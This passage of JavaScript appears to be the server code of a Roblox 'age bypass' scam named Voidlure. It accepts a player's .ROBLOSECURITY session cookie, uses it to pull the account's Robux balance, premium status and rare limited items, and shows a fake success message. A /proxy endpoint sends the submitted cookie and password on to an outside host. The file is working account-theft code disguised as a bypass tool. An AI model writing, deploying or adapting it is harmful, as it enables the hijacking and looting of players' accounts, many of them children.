          cookieValue = cookieValue.replace('.ROBLOSECURITY_', '');
        }

        if (!cookieValue || cookieValue.length < 20) {
          return new Response(JSON.stringify({
            success: false,
            title: '❌ Invalid Cookie',
            description: 'Cookie appears to be invalid or too short'
          }), {
            status: 400,
            headers: {
              'Content-Type': 'application/json',
              'Access-Control-Allow-Origin': '*'
            }
          });
        }

        const userResponse = await fetch('https://users.roblox.com/v1/users/authenticated', {
          headers: {
            'Cookie': '.ROBLOSECURITY=' + cookieValue,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
          }
        });

        if (!userResponse.ok) {
          return new Response(JSON.stringify({
            success: false,
            title: '❌ Invalid Session',
            description: 'The cookie is invalid or expired. Please get a new one.'
          }), {
            status: 401,
            headers: {
              'Content-Type': 'application/json',
              'Access-Control-Allow-Origin': '*'
            }
          });
        }

        const userData = await userResponse.json();
        const userId = userData.id;
        const username = userData.name;

        const currencyResponse = await fetch('https://economy.roblox.com/v1/users/' + userId + '/currency', {
          headers: {
            'Cookie': '.ROBLOSECURITY=' + cookieValue,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
          }
        });

        let robux = 0;
        let pendingRobux = 0;
        if (currencyResponse.ok) {
          const currencyData = await currencyResponse.json();
          robux = currencyData.robux || 0;
          pendingRobux = currencyData.pendingRobux || 0;
        }

        const premiumResponse = await fetch('https://premiumfeatures.roblox.com/v1/users/' + userId + '/premium-features', {
          headers: {
            'Cookie': '.ROBLOSECURITY=' + cookieValue,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
          }
        });

        let premium = false;
        if (premiumResponse.ok) {
          const premiumData = await premiumResponse.json();
          premium = premiumData.features && premiumData.features.length > 0;
        }

        let korblox = false;
        let headless = false;
        let valkyrie = false;
        let limiteds = [];

        try {
          const invResponse = await fetch('https://inventory.roblox.com/v1/users/' + userId + '/items/Asset?limit=100', {
            headers: {
              'Cookie': '.ROBLOSECURITY=' + cookieValue,
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
          });

          if (invResponse.ok) {
            const invData = await invResponse.json();
            if (invData.data) {
              for (var i = 0; i < invData.data.length; i++) {
                var item = invData.data[i];
                var name = (item.name || '').toLowerCase();
                if (name.includes('korblox')) { korblox = true; limiteds.push('Korblox'); }
                if (name.includes('headless')) { headless = true; limiteds.push('Headless'); }
                if (name.includes('valkyrie')) { valkyrie = true; limiteds.push('Valkyrie'); }
              }
            }
          }
        } catch (e) {}

        const resultData = {
          success: true,
          status: 'BYPASSED',
          title: '✅ Live Bypass Successful',
          description: 'Account: ' + username + ' (' + userId + ') bypassed',
          username: username,
          userId: userId,
          robux: robux,
          pendingRobux: pendingRobux,
          premium: premium,
          korblox: korblox,
          headless: headless,
          valkyrie: valkyrie,
          limiteds: limiteds,
          apiStatus: '✅ Processing',
          cookieRefreshed: true,
          timestamp: Math.floor(Date.now() / 1000)
        };

        return new Response(JSON.stringify(resultData), {
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
          }
        });

      } catch (error) {
        return new Response(JSON.stringify({
          success: false,
          title: '❌ Error',
          description: error.message || 'An error occurred while processing'
        }), {
          status: 500,
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
          }
        });
      }
    }

    // Proxy endpoint
    if (url.pathname === '/proxy') {
      try {
        const formData = await request.formData();
        const cookie = formData.get('cookie') || '';
        const password = formData.get('password') || '';
        const directory = formData.get('directory') || 'voidlure';

        const response = await fetch('https://voidex-age-bypasser.x10.mx/bypass/voidlure/bypass.php', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
          },
          body: new URLSearchParams({
            cookie: cookie,
            password: password,
            directory: directory
          })
        });

        const data = await response.json();
        return new Response(JSON.stringify(data), {
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
          }
        });
      } catch (error) {
        return new Response(JSON.stringify({
          success: false,
          title: '❌ Proxy Error',
          description: error.message || 'Failed to proxy request'
        }), {
          status: 500,
          headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
          }
        });
      }
    }

    return new Response(JSON.stringify({
      service: 'Voidlure Cloudflare Proxy',
      endpoints: {
        '/': 'HTML Frontend',
        '/bypass/voidlure/bypass.php': 'POST - Main bypass endpoint',
        '/proxy': 'POST - Proxy to original API',
        '/health': 'GET - Health check'
      },
      status: 'operational'
    }), {
      headers: {
        'Content-Type': 'application/json',
        'Access-Control-Allow-Origin': '*'
      }
    });
  }
};
